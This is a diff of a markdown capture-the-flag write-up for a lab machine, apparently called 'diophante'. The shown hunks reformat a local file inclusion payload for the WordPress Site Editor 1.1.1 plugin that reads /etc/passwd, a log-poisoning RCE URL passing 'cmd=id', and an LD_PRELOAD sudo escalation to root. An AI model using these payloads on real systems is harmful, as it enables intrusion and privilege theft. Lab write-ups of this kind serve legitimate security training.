@@ -112,10 +112,14 @@ Nmap done: 1 IP address (1 host up) scanned in 0.16 seconds
 ## WordPress Plugin Site Editor 1.1.1 - Local File Inclusion
 
 **Proof of Concept**
-`http://<host>/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd`
+```sh
+http://<host>/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
+```
 
 **Our Path**
-`http://hard/blog/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd`
+```sh
+http://hard/blog/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
+```
 
 #### In Action
 
@@ -175,7 +179,9 @@ quit
 
 Now using the `/var/mail/sabine` i will try the RCE
 The path is :
-`view-source:http://hard/blog/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/mail/sabine&cmd=id`
+```sh
+view-source:http://hard/blog/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/mail/sabine&cmd=id
+```
 
 ![image](/assets/img/diophante/6.PNG)
 
@@ -342,7 +348,7 @@ system("/bin/sh");
 leonard@diophante:/tmp$ sudo LD_PRELOAD=/tmp/shell.so ping
 # id
 uid=0(root) gid=0(root) groupes=0(root)
-# 
+#
 ```
 
 
